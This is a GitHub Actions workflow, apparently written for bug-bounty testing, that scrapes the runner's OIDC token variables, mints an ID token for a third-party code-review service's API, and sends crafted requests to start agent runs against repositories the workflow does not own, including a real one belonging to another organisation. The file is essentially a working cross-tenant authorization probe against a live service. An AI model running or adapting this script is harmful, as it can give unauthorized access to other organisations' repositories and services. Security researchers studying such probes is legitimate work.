name: oidc-probe
on:
  push:
    paths:
      - '.trigger'
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Binding full body
        run: |
          API="https://actions.macroscope.com/api/v1/github-actions/agent-runs"
          U=$(env | awk -F= '/^ACTIONS_ID_[A-Z_]*REQUEST_URL=/ {sub(/^[^=]*=/,"");print;exit}')
          T=$(env | awk -F= '/^ACTIONS_ID_[A-Z_]*REQUEST_/ && !/URL=/ {sub(/^[^=]*=/,"");print;exit}')
          OK=$(curl -sS -H "Authorization: bearer $T" "${U}&audience=macroscope" | jq -r .value)
          post() { curl -sS -o /tmp/r.json -w "HTTP=%{http_code} " -X POST -H "Authorization: Bearer $OK" -H "Content-Type: application/json" -d "$1" "$API"; cat /tmp/r.json; echo; }
          C=0000000000000000000000000000000000000000
          echo "S1 nonexistent foreign repo + agent macroscope:"; post "{\"repository\":\"prassoai/zz-does-not-exist-9f2\",\"review\":{\"kind\":\"cra\"},\"agent\":\"macroscope\",\"commit\":\"$C\"}"
          echo "S2 nonexistent foreign repo + agent default:"; post "{\"repository\":\"prassoai/zz-does-not-exist-9f2\",\"review\":{\"kind\":\"cra\"},\"agent\":\"default\",\"commit\":\"$C\"}"
          echo "S3 own repo + agent macroscope:"; post "{\"repository\":\"awley-del/bb-x33\",\"review\":{\"kind\":\"cra\"},\"agent\":\"macroscope\",\"commit\":\"$C\"}"
          echo "S4 foreign real repo prassoai/macroscope-local:"; post "{\"repository\":\"prassoai/macroscope-local\",\"review\":{\"kind\":\"cra\"},\"agent\":\"macroscope\",\"commit\":\"$C\"}"
          echo "S5 own repo approvability (no agent):"; post "{\"repository\":\"awley-del/bb-x33\",\"review\":{\"kind\":\"approvability\"},\"commit\":\"$C\",\"base\":\"$C\",\"pullRequest\":1}"
